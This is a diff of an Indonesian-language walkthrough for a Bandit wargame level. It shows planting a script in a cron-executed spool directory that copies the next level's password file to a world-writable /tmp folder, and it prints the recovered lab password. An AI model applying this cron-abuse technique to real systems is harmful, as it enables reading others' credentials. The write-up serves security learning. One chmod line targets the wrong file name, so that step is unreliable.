@@ -31,8 +31,39 @@ do
     fi
 done
 ```
-intinya shell tersebut mengekskusi dan menghapus script yang ada di direktori ***/var/spool/bandit23*** \
-untuk itu kita buat direktori baru 
+intinya shell tersebut mengekskusi dan menghapus script yang ada di direktori ***/var/spool/bandit24*** \
+untuk itu kita buat direktori baru di ***tmp*** dan membuat shell script di ***/var/spool/bandit24***\
+yang mana untuk copy password pada ***/etc/bandit_pass/bandit24*** ke direktori ***tmp*** \
+kita buat direktori dan atur permissions menjadi r/w
+```
+bandit23@bandit:/var/spool/bandit24$ mkdir /tmp/sol24
+bandit23@bandit:/var/spool/bandit24$ chmod 777 /tmp/sol24
+```
+script seperti ini
+```
+bandit23@bandit:/var/spool/bandit24$ touch ban24.sh
+bandit23@bandit:/var/spool/bandit24$ cat ban24.sh
+#!/bin/bash
+cat /etc/bandit_pass/bandit24 > /tmp/sol24/hasil.txt
+bandit23@bandit:/var/spool/bandit24$ chmod +x cat.sh
 ```
 
+kalo kita coba listing direktori default tidak bisa, harus secara eksplisit
 ```
+bandit23@bandit:/tmp$ ls
+ls: cannot open directory '.': Permission denied
+```
+kalo kita eksplisit didapatkan
+```
+bandit23@bandit:/var/spool/bandit24$ ls /tmp/sol24
+hasil.txt
+```
+langsung kita cetak didapatkan password
+```
+bandit23@bandit:/var/spool/bandit24$ cat /tmp/sol24/hasil.txt
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+```
+<details>
+<summary>Password</summary>
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+</details>
